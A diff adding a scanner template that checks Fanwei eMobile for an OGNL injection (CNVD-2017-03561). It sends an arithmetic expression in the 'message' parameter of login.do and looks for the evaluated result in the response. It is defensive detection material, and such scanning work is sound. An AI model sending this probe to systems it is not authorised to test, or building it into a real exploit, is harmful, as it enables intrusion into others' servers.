@@ -1,0 +1,27 @@
+id: CNVD-2017-03561
+brief:
+    title: Fanwei eMobile - OGNL Injection
+    by: ritikchaddha
+    level: high
+    about: Fanwei eMobile contains an object graph navigation library vulnerability. An attacker can inject arbitrary JavaScript, thus possibly obtaining sensitive information from a database, modifying data,...
+    label:
+        - cnvd
+        - cnvd2017
+        - emobile
+        - ognl
+        - fanwei
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/login.do?message={{num1}}*{{num2}}'
+        - '{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}'
+      signs:
+        - "on": word
+          has:
+            - '{{result}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
